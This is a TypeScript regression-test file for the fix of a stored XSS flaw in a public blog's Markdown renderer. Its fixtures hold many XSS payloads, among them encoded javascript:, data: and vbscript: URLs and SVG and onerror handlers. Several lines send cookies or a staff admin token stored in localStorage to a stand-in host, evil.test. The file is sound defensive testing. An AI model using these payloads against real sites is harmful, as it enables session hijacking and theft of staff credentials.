/**
 * F-1 — stored Markdown XSS in the public blog body.
 *
 * The audit reproduced two executable payloads against the old `renderBody`: a Markdown link with
 * a `javascript:` destination, and an attribute-breakout payload that closed the `href` and opened
 * an `onmouseover` handler. Any COUNSELOR can author a post, the blog is public, and the staff back
 * office shares the origin with its JWT in `localStorage`, so a single hover leaked a staff session.
 *
 * These tests do not check that a string "looks sanitised". They render the *production* component
 * with `react-dom/server`, parse the result with jsdom, and assert on the DOM a browser would
 * actually build: no script elements, no handler attributes, no executable URL schemes, and the
 * author's text still readable. They also execute the rendered document in jsdom with scripts
 * enabled, so a payload that only looked inert would still be caught by observing that nothing ran.
 */
import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync, readdirSync, statSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";

import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { JSDOM } from "jsdom";

import {
  MarkdownBody,
  parseInline,
  parseMarkdown,
  safeHref,
} from "../src/lib/markdown.ts";

const here = dirname(fileURLToPath(import.meta.url));
const srcRoot = join(here, "..", "src");

/** Render one body exactly as the blog page does. */
function render(body: string): string {
  return renderToStaticMarkup(createElement(MarkdownBody, { source: body }));
}

/** Parse rendered output into a document with scripting enabled, and report anything executable. */
function inspect(html: string) {
  const dom = new JSDOM(`<!doctype html><html><body><div id="host">${html}</div></body></html>`, {
    runScripts: "dangerously",
  });
  const { document } = dom.window;
  const host = document.getElementById("host")!;

  const handlers: string[] = [];
  const scripts: string[] = [];
  const urls: string[] = [];
  for (const el of Array.from(host.querySelectorAll("*"))) {
    for (const attr of Array.from(el.attributes)) {
      if (/^on/i.test(attr.name)) handlers.push(`${el.tagName.toLowerCase()}[${attr.name}]`);
      if (attr.name === "href" || attr.name === "src" || attr.name === "srcset") {
        urls.push(attr.value);
      }
    }
    if (/^(script|object|embed|iframe|svg|math|base|form)$/i.test(el.tagName)) {
      scripts.push(el.tagName.toLowerCase());
    }
  }
  return { dom, document, host, handlers, scripts, urls, text: host.textContent ?? "" };
}

const EXECUTABLE = /^(javascript|vbscript|data|file|blob):/i;

// =====================================================================
// 1. the two payloads the audit reproduced
// =====================================================================
test("a javascript: link destination produces no link at all", () => {
  const html = render("[Read more](javascript:location='//evil.test/?t='+localStorage.x)");
  const dom = inspect(html);
  assert.deepEqual(dom.urls, [], "no href may be produced for a refused destination");
  assert.equal(dom.host.querySelectorAll("a").length, 0);
  // The author's text survives; the destination is dropped rather than rewritten.
  assert.match(dom.text, /Read more/);
});

test("an attribute-breakout payload cannot add an event handler", () => {
  const html = render('[x](a" autofocus onfocus="location=\'//evil.test/?c=\'+document.cookie)');
  const dom = inspect(html);
  assert.deepEqual(dom.handlers, [], "no on* attribute may appear anywhere in the output");
  assert.deepEqual(dom.urls, []);
  assert.equal(dom.host.querySelectorAll("a").length, 0);
});

// =====================================================================
// 2. scheme variants
// =====================================================================
const DANGEROUS_SCHEMES = [
  "javascript:alert(1)",
  "JaVaScRiPt:alert(1)",
  "JAVASCRIPT:alert(1)",
  "  javascript:alert(1)",
  "\tjavascript:alert(1)",
  "\njavascript:alert(1)",
  "java\tscript:alert(1)",
  "java\nscript:alert(1)",
  "javascript\u0000:alert(1)",
  "javascript&colon;alert(1)",
  "&#106;avascript:alert(1)",
  "&#x6a;avascript:alert(1)",
  "javascript%3Aalert(1)",
  "%6Aavascript:alert(1)",
  "data:text/html,<script>alert(1)</script>",
  "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
  "vbscript:msgbox(1)",
  "file:///etc/passwd",
  "blob:https://evil.test/uuid",
  "//evil.test/steal",
];

test("every dangerous or encoded scheme is refused by the URL policy", () => {
  for (const value of DANGEROUS_SCHEMES) {
    assert.equal(safeHref(value), null, `${JSON.stringify(value)} must not become an href`);
  }
});

test("no dangerous scheme survives into rendered markup", () => {
  for (const value of DANGEROUS_SCHEMES) {
    const html = render(`read [here](${value})`);
    const dom = inspect(html);
    assert.equal(dom.host.querySelectorAll("a").length, 0, `link emitted for ${value}`);
    assert.deepEqual(dom.urls, [], `href emitted for ${value}`);
    assert.deepEqual(dom.handlers, []);
    assert.ok(!EXECUTABLE.test(html.replace(/href="[^"]*"/g, "")), `executable text for ${value}`);
  }
});

// =====================================================================
// 3. raw HTML and SVG payloads are text, not markup
// =====================================================================
const RAW_HTML = [
  "<img src=x onerror=alert(1)>",
  "<script>alert(1)</script>",
  "</script><script>alert(document.cookie)</script>",
  '<svg/onload=alert(1)>',
  "<svg><script>alert(1)</script></svg>",
  '<iframe src="javascript:alert(1)"></iframe>',
  '<a href="javascript:alert(1)">x</a>',
  "<style>body{display:none}</style>",
  "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
  '<object data="javascript:alert(1)"></object>',
  "<base href=\"https://evil.test/\">",
  "<!-- comment --><script>alert(1)</script>",
];

test("raw HTML and SVG in a post body are rendered as text", () => {
  for (const payload of RAW_HTML) {
    const html = render(payload);
    const dom = inspect(html);
    assert.deepEqual(dom.scripts, [], `element emitted for ${payload}`);
    assert.deepEqual(dom.handlers, [], `handler emitted for ${payload}`);
    assert.deepEqual(dom.urls, [], `url emitted for ${payload}`);
    // Nothing was silently dropped either: the author sees exactly what they typed.
    assert.ok(dom.text.includes(payload) || dom.text.includes(payload.replace(/\s+/g, " ")),
      `payload not preserved as text: ${payload} -> ${dom.text}`);
  }
});

test("a script in the body does not execute when the page is parsed", () => {
  const dom = new JSDOM(
    `<!doctype html><html><body><div id="host">${render(
      "<script>window.__pwned = true</script>\n\n[x](javascript:window.__pwned=true)",
    )}</div></body></html>`,
    { runScripts: "dangerously" },
  );
  assert.equal((dom.window as unknown as { __pwned?: boolean }).__pwned, undefined);
  assert.equal(dom.window.document.querySelectorAll("script").length, 0);
});

// =====================================================================
// 4. ordinary Markdown still works
// =====================================================================
test("safe links are preserved exactly", () => {
  const cases: [string, string][] = [
    ["[docs](https://example.edu/fees)", "https://example.edu/fees"],
    ["[insecure](http://example.edu/old)", "http://example.edu/old"],
    ["[query](https://example.edu/?a=1&b=2)", "https://example.edu/?a=1&b=2"],
    ["[relative](/blog/other)", "/blog/other"],
    ["[dotrelative](../fees)", "../fees"],
    ["[fragment](#intakes)", "#intakes"],
    ["[mail](mailto:hello@example.edu)", "mailto:hello@example.edu"],
    ["[phone](tel:+8801700000000)", "tel:+8801700000000"],
  ];
  for (const [markdown, expected] of cases) {
    const dom = inspect(render(markdown));
    assert.equal(dom.urls.length, 1, `no link produced for ${markdown}`);
    assert.equal(dom.urls[0], expected, `wrong href for ${markdown}`);
    assert.deepEqual(dom.handlers, []);
  }
});

test("outbound links carry rel, same-site links do not need it", () => {
  const external = inspect(render("[a](https://example.edu/x)"));
  assert.equal(external.host.querySelector("a")!.getAttribute("rel"), "noopener noreferrer");
  const relative = inspect(render("[a](/blog/x)"));
  assert.equal(relative.host.querySelector("a")!.getAttribute("rel"), null);
});

test("ordinary formatting renders as the elements it says", () => {
  const html = render(
    [
      "## A heading",
      "",
      "A paragraph with **bold**, *italic* and `code`.",
      "",
      "> a quote",
      "",
      "- first",
      "- second",
      "1. one",
      "",
      "### Smaller",
    ].join("\n"),
  );
  const dom = inspect(html);
  assert.equal(dom.host.querySelectorAll("h2").length, 1);
  assert.equal(dom.host.querySelectorAll("h3").length, 1);
  assert.equal(dom.host.querySelectorAll("blockquote").length, 1);
  assert.equal(dom.host.querySelectorAll("ul > li").length, 2);
  assert.equal(dom.host.querySelectorAll("ol > li").length, 1);
  assert.equal(dom.host.querySelectorAll("p strong").length, 1);
  assert.equal(dom.host.querySelectorAll("p em").length, 1);
  assert.equal(dom.host.querySelectorAll("p code").length, 1);
});

test("text is escaped where it is displayed, and ampersands survive a round trip", () => {
  const dom = inspect(render("Tom & Jerry < 3, 5 > 2"));
  assert.match(dom.text, /Tom & Jerry < 3, 5 > 2/);
});

test("emphasis inside link text does not swallow the destination", () => {
  const inlines = parseInline("**[a](https://example.edu/x)**");
  const kinds = inlines.map((i) => i.kind);
  assert.ok(kinds.includes("strong") || kinds.includes("link"),
    "the parse must stay structured rather than collapsing to text");
});

// =====================================================================
// 5. residual risks that were specifically probed
// =====================================================================
test("a destination containing quotes but no spaces cannot break out either", () => {
  // The link pattern cannot express this as a link (quotes are not path characters), and even if
  // it could, React escapes the attribute value.
  const html = render('[x](a"onmouseover="alert(1)"y)');
  const dom = inspect(html);
  assert.deepEqual(dom.handlers, []);
  for (const url of dom.urls) assert.ok(!url.startsWith("javascript"), url);
});

test("nested and malformed Markdown does not resurrect a refused destination", () => {
  const payloads = [
    "[![x](javascript:alert(1))](javascript:alert(2))",
    "[[x]](javascript:alert(1))",
    "[x](java\nscript:alert(1))",
    "**[x](javascript:alert(1))**",
    "*[x](vbscript:msgbox(1))*",
    "`[x](javascript:alert(1))`",
    "[x](https://example.edu/a)[y](javascript:alert(1))",
    '**[click](https://ok.test/")**',
  ];
  for (const payload of payloads) {
    const dom = inspect(render(payload));
    assert.deepEqual(dom.handlers, [], payload);
    for (const url of dom.urls) {
      assert.ok(!EXECUTABLE.test(url), `${payload} produced ${url}`);
      assert.ok(!url.includes('"'), `${payload} produced a quoted href`);
    }
  }
});

test("content stored before the fix renders inert after it", () => {
  // A post written while the old renderer was live is already in the database. Nothing migrates it:
  // the same bytes are decoded by the new renderer and come out as text.
  const stored = [
    "Enjoy the article!",
    "",
    "[Claim your scholarship](javascript:fetch('//evil.test/?c='+localStorage.getItem('scholara.admin.token')))",
    "",
    '<img src=x onerror="fetch(\'//evil.test/?c=\'+localStorage.getItem(\'scholara.admin.token\'))">',
  ].join("\n");
  const dom = inspect(render(stored));
  assert.deepEqual(dom.urls, []);
  assert.deepEqual(dom.handlers, []);
  assert.deepEqual(dom.scripts, []);
  assert.match(dom.text, /Claim your scholarship/);
});

test("the renderer never produces a string of markup", () => {
  // The component must not be a sanitizer: if it returned HTML, a caller could reintroduce innerHTML.
  const blocks = parseMarkdown("[x](https://example.edu)");
  assert.ok(Array.isArray(blocks) && typeof blocks[0] === "object");
  const body = MarkdownBody({ source: "- one\n- two" });
  assert.equal(typeof body, "object", "MarkdownBody returns an element, not a string");
});

// =====================================================================
// 6. the vulnerable sink is gone and stays gone
// =====================================================================
test("no page passes post content to dangerouslySetInnerHTML", () => {
  const offenders: string[] = [];
  const walk = (dir: string) => {
    for (const entry of readdirSync(dir)) {
      const full = join(dir, entry);
      if (statSync(full).isDirectory()) walk(full);
      else if (full.endsWith(".tsx") || full.endsWith(".ts")) {
        const text = readFileSync(full, "utf8");
        for (const line of text.split("\n")) {
          if (!line.includes("dangerouslySetInnerHTML=")) continue;
          // The only permitted sink is centralised JSON-LD, which has its own escaping contract.
          if (!line.includes("jsonLdScript(")) offenders.push(`${full}: ${line.trim()}`);
        }
      }
    }
  };
  walk(srcRoot);
  assert.deepEqual(offenders, [], "user content must never be rendered as markup");
});

test("the blog page renders the body through the safe component", () => {
  const page = readFileSync(join(srcRoot, "app", "blog", "[slug]", "page.tsx"), "utf8");
  assert.match(page, /<MarkdownBody source=\{p\.body \?\? ""\} \/>/);
  assert.ok(!page.includes("renderBody"), "the string renderer must not come back");
});

// =====================================================================
// 7. the CSP is configured, and is honest about what it covers
// =====================================================================
test("the CSP blocks inline event handlers and plugins, and grants no unsafe-eval", async () => {
  const { buildCsp } = await import("../config/csp.js");
  const prod = buildCsp({ isDev: false });
  assert.match(prod, /object-src 'none'/);
  assert.match(prod, /base-uri 'self'/);
  assert.match(prod, /frame-ancestors 'none'/);
  assert.match(prod, /form-action 'self'/);
  assert.match(prod, /script-src-attr 'none'/);
  assert.match(prod, /upgrade-insecure-requests/);
  assert.ok(!prod.includes("unsafe-eval"), "production must never allow eval");
  assert.ok(!/\bdefault-src \*/.test(prod));
  assert.ok(!prod.includes("script-src *"));

  const dev = buildCsp({ isDev: true });
  assert.match(dev, /script-src-attr 'none'/);
  assert.match(dev, /unsafe-eval/, "next dev needs eval source maps, and says so");
});

test("the app actually sends the CSP header", () => {
  const config = readFileSync(join(here, "..", "next.config.ts"), "utf8");
  assert.match(config, /Content-Security-Policy/);
  assert.match(config, /buildCsp\(/);
});

// =====================================================================
// 8. rendering cost is bounded (availability)
// =====================================================================
test("pathological bodies render in linear time", () => {
  // Found while attacking this fix: the first single-pass parser re-ran four regexes over the
  // remaining text for every construct, so 60k emphasis spans took ~12 s of CPU in a server render
  // and every ISR regeneration repeated it. A stored body is staff-authored, but it is still input.
  const cases: [string, string][] = [
    ["emphasis", "*a*".repeat(60000)],
    ["links", "[a](https://example.edu/p)".repeat(10000)],
    ["unterminated brackets", "[".repeat(200000)],
    ["stray parentheses", "[a](" + ")".repeat(200000)],
    ["backticks", "`".repeat(100000)],
    ["unterminated link", "[" + "a".repeat(200000)],
    ["mixed hostile", "[a](javascript:1)*b*".repeat(11000)],
  ];
  for (const [label, body] of cases) {
    const started = performance.now();
    parseMarkdown(body);
    const elapsed = performance.now() - started;
    assert.ok(elapsed < 1500, `${label}: ${elapsed.toFixed(0)}ms for ${body.length} chars`);
  }
});
